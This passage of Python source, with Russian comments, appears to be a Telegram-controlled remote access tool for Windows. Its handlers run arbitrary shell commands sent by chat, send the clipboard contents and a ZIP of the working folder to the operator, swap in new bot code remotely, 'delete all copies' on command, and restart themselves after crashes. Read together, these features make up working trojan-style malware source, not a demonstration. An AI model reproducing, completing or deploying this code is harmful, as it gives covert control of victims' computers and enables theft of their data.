                if message.from_user.id != int(ID):
                    return
                os.system("rundll32.exe mouse,enable")
                await bot.send_message(chat_id=ID, text="Мышь включена")

            # ---------- БУФЕР ОБМЕНА ----------
            @dp.message_handler(commands=['clipboard'])
            async def clipboard_handler(message: types.Message):
                if message.from_user.id != int(ID):
                    return
                try:
                    text = pyperclip.paste()
                    await bot.send_message(chat_id=ID, text=text if text else "Пусто")
                except:
                    await bot.send_message(chat_id=ID, text="Ошибка")

            # ---------- ALT+F4 ----------
            @dp.message_handler(commands=['alt_f4'])
            async def alt_f4_handler(message: types.Message):
                if message.from_user.id != int(ID):
                    return
                try:
                    import pygetwindow
                    active = pygetwindow.getActiveWindow()
                    if active:
                        active.close()
                        await bot.send_message(chat_id=ID, text="Активное окно закрыто")
                    else:
                        await bot.send_message(chat_id=ID, text="Нет активного окна")
                except:
                    await bot.send_message(chat_id=ID, text="Ошибка закрытия")

            # ---------- ЗАПУСК ПРОГРАММЫ ----------
            @dp.message_handler(commands=['runprogramm'])
            async def runprogramm_handler(message: types.Message):
                if message.from_user.id != int(ID):
                    return
                prog = message.get_args()
                if prog:
                    try:
                        subprocess.Popen(prog, shell=True)
                        await bot.send_message(chat_id=ID, text=f"Запущено: {prog}")
                    except Exception as e:
                        await bot.send_message(chat_id=ID, text=f"Ошибка: {e}")

            # ---------- ГОЛОСОВОЕ СООБЩЕНИЕ ----------
            @dp.message_handler(content_types=['voice'])
            async def voice_handler(message: types.Message):
                if message.from_user.id != int(ID):
                    return
                try:
                    await bot.send_message(chat_id=ID, text="Сейчас запущу голосовое...")
                    file_id = message.voice.file_id
                    file = await bot.get_file(file_id)
                    file_path = file.file_path
                    await bot.download_file(file_path, message.voice.file_unique_id + '.ogg')
                    os.system(message.voice.file_unique_id + '.ogg')
                    await bot.send_message(chat_id=ID, text="Голосовое воспроизведено")
                    time.sleep(60)
                    os.remove(message.voice.file_unique_id + '.ogg')
                except Exception as e:
                    await bot.send_message(ID, f"Ошибка: {e}")

            # ---------- ОБНОВЛЕНИЕ И САМОУНИЧТОЖЕНИЕ ----------
            update_states = {}

            @dp.message_handler(commands=['update'])
            async def update_command(message: types.Message):
                if message.from_user.id != int(ID):
                    await bot.send_message(message.chat.id, 'Вы не являетесь админом!!!')
                    return
                await bot.send_message(chat_id=ID, text='Отправьте новый код бота (весь код)')
                update_states[message.chat.id] = 'waiting_for_code'

            @dp.message_handler(content_types=['document'])
            async def handle_document(message: types.Message):
                if message.from_user.id != int(ID):
                    return
                if message.chat.id not in update_states or update_states[message.chat.id] != 'waiting_for_code':
                    return
                try:
                    file = await bot.get_file(message.document.file_id)
                    downloaded = await bot.download_file(file.file_path)
                    new_code = downloaded.read().decode('utf-8')
                    if len(new_code) < 100:
                        await bot.send_message(chat_id=ID, text='Код слишком короткий')
                        return
                    if update_bot(new_code):
                        await bot.send_message(chat_id=ID, text='Обновление успешно, перезапуск...')
                    else:
                        await bot.send_message(chat_id=ID, text='Ошибка обновления')
                    del update_states[message.chat.id]
                except Exception as e:
                    await bot.send_message(chat_id=ID, text=f'Ошибка: {e}')

            @dp.message_handler(lambda msg: msg.chat.id in update_states and update_states[msg.chat.id] == 'waiting_for_code')
            async def handle_text_update(message: types.Message):
                if message.from_user.id != int(ID):
                    return
                new_code = message.text
                if len(new_code) < 100:
                    await bot.send_message(chat_id=ID, text='Код слишком короткий')
                    return
                if update_bot(new_code):
                    await bot.send_message(chat_id=ID, text='Обновление успешно, перезапуск...')
                else:
                    await bot.send_message(chat_id=ID, text='Ошибка обновления')
                del update_states[message.chat.id]

            @dp.message_handler(commands=['selfdestruct'])
            async def selfdestruct_command(message: types.Message):
                if message.from_user.id != int(ID):
                    await bot.send_message(message.chat.id, 'Вы не админ!')
                    return
                keyboard = InlineKeyboardMarkup()
                keyboard.add(InlineKeyboardButton('ПОДТВЕРДИТЬ УДАЛЕНИЕ', callback_data='confirm_delete'))
                keyboard.add(InlineKeyboardButton('ОТМЕНИТЬ', callback_data='cancel_delete'))
                await bot.send_message(chat_id=ID, text='ВНИМАНИЕ! Удалить все копии?', reply_markup=keyboard)

            @dp.callback_query_handler(lambda c: c.data in ['confirm_delete', 'cancel_delete'])
            async def delete_callback(callback: types.CallbackQuery):
                if callback.from_user.id != int(ID):
                    await bot.answer_callback_query(callback.id, text='Не админ')
                    return
                if callback.data == 'confirm_delete':
                    await bot.send_message(chat_id=ID, text='Удаление...')
                    if self_destruct():
                        await bot.send_message(chat_id=ID, text='Бот удалён')
                        await bot.stop_polling()
                        sys.exit(0)
                    else:
                        await bot.send_message(chat_id=ID, text='Ошибка удаления')
                else:
                    await bot.send_message(chat_id=ID, text='Отменено')

            @dp.message_handler(commands=['getfolder'])
            async def getfolder_handler(message: types.Message):
                if message.from_user.id != int(ID):
                    return
                await bot.send_message(chat_id=ID, text='Создаю ZIP...')
                zip_data = zip_folder(os.getcwd())
                if zip_data:
                    file_obj = io.BytesIO(zip_data)
                    file_obj.name = 'folder.zip'
                    await bot.send_document(chat_id=ID, document=file_obj)
                else:
                    await bot.send_message(chat_id=ID, text='Ошибка создания ZIP')

            @dp.callback_query_handler(lambda c: c.data == 'next')
            async def next_callback(callback: types.CallbackQuery):
                await bot.send_message(chat_id=ID, text=help_text)

            # ---------- ГЛАВНЫЙ ЦИКЛ ЗАПУСКА (с ожиданием интернета) ----------
            while True:
                try:
                    wait_for_internet()
                    if not wait_for_telegram():
                        debug_print("Не удалось соединиться с Telegram API, перезапуск цикла...")
                        time.sleep(10)
                        continue
                    debug_print("Запуск polling...")
                    executor.start_polling(dp, skip_updates=True, on_startup=on_startup)
                    debug_print("Polling завершился, перезапуск через 5 сек...")
                    time.sleep(5)
                except KeyboardInterrupt:
                    debug_print("Принудительная остановка")
                    sys.exit(0)
                except Exception as e:
                    debug_print(f"Ошибка в polling: {e}, перезапуск через 10 сек...")
                    time.sleep(10)

        except Exception as e:
            # Критическая ошибка верхнего уровня – пишем в лог и перезапускаем весь скрипт
            error_text = traceback.format_exc()
            log_error_to_file(error_text)
            try:
                with open(os.path.join(script_dir, "bot_debug.log"), "a", encoding="utf-8") as f:
                    f.write(f"\n--- {time.strftime('%Y-%m-%d %H:%M:%S')} КРИТИЧЕСКАЯ ОШИБКА ---\n")
                    f.write(error_text)
                    f.write("\n")
            except:
                pass
            time.sleep(5)
            # Перезапуск скрипта (чтобы заново прогрузить импорты)
            os.execv(sys.executable, [sys.executable] + sys.argv)